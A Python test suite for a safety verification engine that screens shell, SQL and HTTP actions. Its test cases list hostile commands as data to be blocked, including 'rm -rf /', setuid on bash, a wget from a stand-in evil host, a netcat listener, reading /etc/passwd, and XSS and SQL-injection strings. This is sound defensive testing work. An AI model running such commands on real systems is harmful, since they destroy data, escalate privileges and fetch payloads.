"""
Test Verification Engine
=========================

Comprehensive tests for the safety verification system.
"""

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..'))

from execution.verification import (
    VerificationEngine,
    NoDestructiveOperationsRule,
    NoPrivilegeEscalationRule,
    NoNetworkAccessRule,
    InputValidationRule,
    OutputSizeRule,
    VerificationStatus
)


def test_destructive_operations():
    """Test detection of destructive operations."""
    print("\n[TEST 1] Destructive Operations Detection")
    print("-" * 60)

    rule = NoDestructiveOperationsRule()

    # Test dangerous commands
    dangerous = [
        {"type": "shell", "command": "rm -rf /"},
        {"type": "sql", "query": "DROP TABLE users"},
        {"type": "shell", "command": "DELETE FROM users WHERE 1=1"},
        {"type": "shell", "command": "format C:"},
    ]

    for action in dangerous:
        result = rule.verify_pre_execution(action, {})
        print(f"  {action}: {result['status'].name}")
        assert result["status"] == VerificationStatus.FAILED, f"Should block {action}"

    # Test safe commands
    safe = [
        {"type": "shell", "command": "ls -la"},
        {"type": "sql", "query": "SELECT * FROM users LIMIT 10"},
        {"type": "shell", "command": "mkdir test_folder"},
    ]

    for action in safe:
        result = rule.verify_pre_execution(action, {})
        assert result["status"] == VerificationStatus.PASSED, f"Should allow {action}"

    print("  [PASSED]")


def test_privilege_escalation():
    """Test detection of privilege escalation."""
    print("\n[TEST 2] Privilege Escalation Detection")
    print("-" * 60)

    rule = NoPrivilegeEscalationRule()

    # Test privilege escalation
    escalation = [
        {"type": "shell", "command": "sudo rm -rf /"},
        {"type": "shell", "command": "su - root"},
        {"type": "shell", "command": "chmod 777 /etc/passwd"},
        {"type": "shell", "command": "chmod +s /bin/bash"},
    ]

    for action in escalation:
        result = rule.verify_pre_execution(action, {})
        print(f"  {action['command'][:30]}: {result['status'].name}")
        assert result["status"] == VerificationStatus.FAILED

    print("  [PASSED]")


def test_network_access():
    """Test network access control."""
    print("\n[TEST 3] Network Access Control")
    print("-" * 60)

    rule = NoNetworkAccessRule()

    # Test network operations
    network_ops = [
        {"type": "http", "url": "http://example.com"},
        {"type": "shell", "command": "curl http://malicious.com"},
        {"type": "shell", "command": "wget http://evil.com/payload"},
        {"type": "shell", "command": "nc -l 4444"},
    ]

    for action in network_ops:
        result = rule.verify_pre_execution(action, {})
        print(f"  {action}: {result['status'].name}")
        assert result["status"] in [VerificationStatus.FAILED, VerificationStatus.WARNING]

    # Test allowed internal requests
    result = rule.verify_pre_execution(
        {"type": "http", "url": "http://localhost:8000/api"},
        {}
    )
    assert result["status"] == VerificationStatus.PASSED

    print("  [PASSED]")


def test_input_validation():
    """Test input validation."""
    print("\n[TEST 4] Input Validation")
    print("-" * 60)

    rule = InputValidationRule()

    # Test valid inputs
    valid = [
        {"type": "analysis", "input": "Analyze this code for vulnerabilities"},
        {"type": "shell", "command": "ls -la /home/user"},
        {"type": "sql", "query": "SELECT id, name FROM users WHERE id = ?", "params": [1]},
    ]

    for action in valid:
        result = rule.verify_pre_execution(action, {})
        assert result["status"] == VerificationStatus.PASSED

    # Test suspicious patterns
    suspicious = [
        {"type": "shell", "command": "echo '<script>alert(1)</script>'"},
        {"type": "sql", "query": "SELECT * FROM users WHERE name = '; DROP TABLE users--'"},
    ]

    for action in suspicious:
        result = rule.verify_pre_execution(action, {})
        print(f"  Suspicious pattern: {result['status'].name}")
        assert result["status"] == VerificationStatus.WARNING

    print("  [PASSED]")


def test_output_size_limits():
    """Test output size limits."""
    print("\n[TEST 5] Output Size Limits")
    print("-" * 60)

    rule = OutputSizeRule()

    # Test normal output
    normal_result = {
        "output": "Hello, world! " * 100,  # ~1.3KB
        "success": True
    }
    result = rule.verify_post_execution({}, normal_result, {})
    assert result["status"] == VerificationStatus.PASSED

    # Test large output
    large_result = {
        "output": "X" * 15_000_000,  # 15MB
        "success": True
    }
    result = rule.verify_post_execution({}, large_result, {})
    print(f"  Large output (15MB): {result['status'].name}")
    assert result["status"] == VerificationStatus.WARNING

    # Test excessive output
    excessive_result = {
        "output": "X" * 150_000_000,  # 150MB
        "success": True
    }
    result = rule.verify_post_execution({}, excessive_result, {})
    print(f"  Excessive output (150MB): {result['status'].name}")
    assert result["status"] == VerificationStatus.FAILED

    print("  [PASSED]")


def test_verification_engine():
    """Test complete verification engine."""
    print("\n[TEST 6] Complete Verification Engine")
    print("-" * 60)

    engine = VerificationEngine()

    # Test pre-execution verification
    actions = [
        {"type": "shell", "command": "ls -la"},  # Safe
        {"type": "shell", "command": "rm -rf /"},  # Dangerous
        {"type": "sql", "query": "SELECT * FROM users"},  # Safe
        {"type": "shell", "command": "sudo apt install malware"},  # Escalation
    ]

    results = []
    for action in actions:
        result = engine.verify_pre_execution(action, {})
        results.append(result)
        print(f"  {action}: {result['status'].name} ({result['risk_level']})")

    # Check results
    assert results[0]["status"] == VerificationStatus.PASSED
    assert results[1]["status"] == VerificationStatus.FAILED
    assert results[2]["status"] == VerificationStatus.PASSED
    assert results[3]["status"] == VerificationStatus.FAILED

    # Test post-execution verification
    execution_result = {
        "output": "Command executed successfully",
        "success": True
    }
    result = engine.verify_post_execution(actions[0], execution_result, {})
    assert result["status"] == VerificationStatus.PASSED

    print("  [PASSED]")


def test_verification_stats():
    """Test verification statistics."""
    print("\n[TEST 7] Verification Statistics")
    print("-" * 60)

    engine = VerificationEngine()

    # Run multiple verifications
    test_actions = [
        {"type": "shell", "command": "ls"},
        {"type": "shell", "command": "rm -rf /"},
        {"type": "shell", "command": "pwd"},
        {"type": "shell", "command": "sudo su"},
    ]

    for action in test_actions:
        engine.verify_pre_execution(action, {})

    stats = engine.get_stats()
    print(f"  Total verifications: {stats['total_verifications']}")
    print(f"  Passed: {stats['passed']}")
    print(f"  Failed: {stats['failed']}")
    print(f"  Warnings: {stats['warnings']}")
    print(f"  Active rules: {stats['active_rules']}")

    assert stats["total_verifications"] == 4
    assert stats["failed"] >= 2  # At least the 2 dangerous ones
    assert stats["passed"] >= 2  # At least the 2 safe ones

    print("  [PASSED]")


def test_custom_rules():
    """Test custom verification rules."""
    print("\n[TEST 8] Custom Rule Integration")
    print("-" * 60)

    from execution.verification import VerificationRule, RiskLevel

    class NoPasswordOperationsRule(VerificationRule):
        """Custom rule to prevent password operations."""
        name = "no_password_operations"
        risk_level = RiskLevel.HIGH

        def verify_pre_execution(self, action, context):
            content = str(action).lower()
            if "password" in content or "passwd" in content:
                return {
                    "status": VerificationStatus.FAILED,
                    "rule": self.name,
                    "reason": "Password operations not allowed",
                    "risk_level": self.risk_level.name
                }
            return {
                "status": VerificationStatus.PASSED,
                "rule": self.name,
                "reason": "No password operations detected",
                "risk_level": RiskLevel.LOW.name
            }

    # Test custom rule
    engine = VerificationEngine()
    engine.add_rule(NoPasswordOperationsRule())

    # Test action with password
    password_action = {"type": "shell", "command": "cat /etc/passwd"}
    result = engine.verify_pre_execution(password_action, {})
    print(f"  Password action: {result['status'].name}")

    # Should fail because custom rule blocks it
    failed = any(
        r["status"] == VerificationStatus.FAILED
        for r in result.get("rule_results", [])
        if r.get("rule") == "no_password_operations"
    )
    assert failed, "Custom rule should block password operations"

    print("  [PASSED]")


def main():
    """Run all tests."""
    print("=" * 60)
    print("VERIFICATION ENGINE TEST SUITE")
    print("=" * 60)

    try:
        test_destructive_operations()
        test_privilege_escalation()
        test_network_access()
        test_input_validation()
        test_output_size_limits()
        test_verification_engine()
        test_verification_stats()
        test_custom_rules()

        print("\n" + "=" * 60)
        print("ALL TESTS PASSED (8/8)")
        print("=" * 60)
        print("\n[SUMMARY]")
        print("  Destructive Operations: Blocked")
        print("  Privilege Escalation: Blocked")
        print("  Network Access: Controlled")
        print("  Input Validation: Working")
        print("  Output Limits: Enforced")
        print("  Engine Integration: Operational")
        print("  Statistics Tracking: Working")
        print("  Custom Rules: Supported")
        print("\n  Verification system ready for production")

    except AssertionError as e:
        print(f"\n[FAILED] {e}")
        return 1

    return 0


if __name__ == "__main__":
    sys.exit(main())
